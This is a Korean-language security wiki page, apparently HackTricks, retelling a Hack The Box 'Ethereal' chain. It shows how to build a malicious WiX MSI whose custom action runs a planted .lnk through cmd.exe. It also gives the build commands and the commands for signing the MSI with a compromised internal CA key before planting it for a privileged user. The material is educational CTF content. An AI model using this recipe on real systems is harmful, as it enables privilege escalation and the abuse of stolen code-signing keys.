# WiX를 사용한 Custom-Action MSI 생성

{{#include ../../banners/hacktricks-training.md}}

이 역사적인 Hack The Box chain에서는 WiX Toolset v3를 사용하여 이전에 심어 둔 `.lnk` 파일을 실행하는 MSI를 빌드했습니다. **MSI가 자동으로 privileged 상태가 되는 것은 아닙니다**: 실행은 Windows Installer policy, custom-action attributes, 그리고 이를 설치하는 사용자에 의해 선택된 context에서 이루어집니다. 해당 시나리오에서 attacker는 신뢰된 signing CA도 탈취하고, 서명된 MSI를 다른 사용자가 감시하는 folder에 배치했습니다.<sup>[[1]](#references)[[3]](#references)</sup>

WiX MSI 사용 예제를 종합적으로 이해하려면 [이 페이지](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)를 참고하는 것이 좋습니다. 여기에서 WiX MSI의 사용 방법을 보여 주는 다양한 예제를 확인할 수 있습니다.<sup>[[2]](#references)</sup>

MSI는 `C:\Users\Public\Desktop\Shortcuts\rick.lnk`를 실행합니다. 원본 WiX v3 XML은 아래에 보존되어 있습니다.<sup>[[1]](#references)</sup>
```html
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
`InstallerVersion`은 최소 Windows Installer 버전을 선언하고, `Compressed="yes"`는 package가 압축되었음을 나타냅니다. `Stage1`은 deferred이지만 `Impersonate="yes"`로 설정되어 있으므로 설치 사용자의 impersonated token으로 실행됩니다. 이 시나리오에서 privilege 변경은 해당 attribute가 마법처럼 SYSTEM 권한을 부여한 것이 아니라, 이후 MSI를 연 privileged user로부터 발생했습니다.<sup>[[3]](#references)</sup>

`candle.exe`를 사용하여 source를 WiX object로 compile합니다:<sup>[[1]](#references)</sup>
```
candle.exe -out C:\tmp\wix.wixobj C:\tmp\Ethereal\msi.xml
```
`light.exe`를 사용하여 해당 객체를 MSI에 링크합니다:<sup>[[1]](#references)</sup>
```
light.exe -out C:\tmp\Ethereal\rick.msi C:\tmp\wix.wixobj
```
### 원래 체인에서 사용된 서명 단계

대상 workflow는 손상된 내부 CA가 서명한 패키지를 허용했습니다. 해당 write-up에서는 복구된 `MyCA.cer`/`MyCA.pvk`에서 signing certificate를 생성하고, PFX를 만든 다음 MSI에 서명했습니다:<sup>[[1]](#references)</sup>
```powershell
makecert.exe -n "CN=Ethereal" -pe -cy end `
-ic C:\tmp\MyCA.cer -iv C:\tmp\MyCA.pvk -sky signature `
-sv C:\tmp\rick.pvk C:\tmp\rick.cer
pvk2pfx.exe -pvk C:\tmp\rick.pvk -spc C:\tmp\rick.cer -pfx C:\tmp\rick.pfx
signtool.exe sign /f C:\tmp\rick.pfx C:\tmp\Ethereal\rick.msi
```
공격자는 서명된 패키지를 `D:\DEV\MSIs`에 배치한 후, 권한이 있는 workflow/user가 이를 실행할 때까지 기다렸습니다. 이 기법을 적용할 때는 해당 사전 조건을 유지해야 합니다. 권한 상승 설치 경로, `AlwaysInstallElevated`와 같은 안전하지 않은 policy 또는 권한이 있는 victim이 없으면 이 패키지는 현재 사용자의 권한으로만 실행됩니다.

## References

- [1] [Hack The Box - Ethereal: 악성 msi 생성 및 root 권한 획득 - 0xRick's Blog](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [2] [간단한 소개: WiX로 MSI installer 생성 - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (see also [wixtools](http://wixtoolset.org))
- [3] [Microsoft Learn — 지연 실행 custom actions (`Impersonate`)](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-in-script-execution-options)
{{#include ../../banners/hacktricks-training.md}}
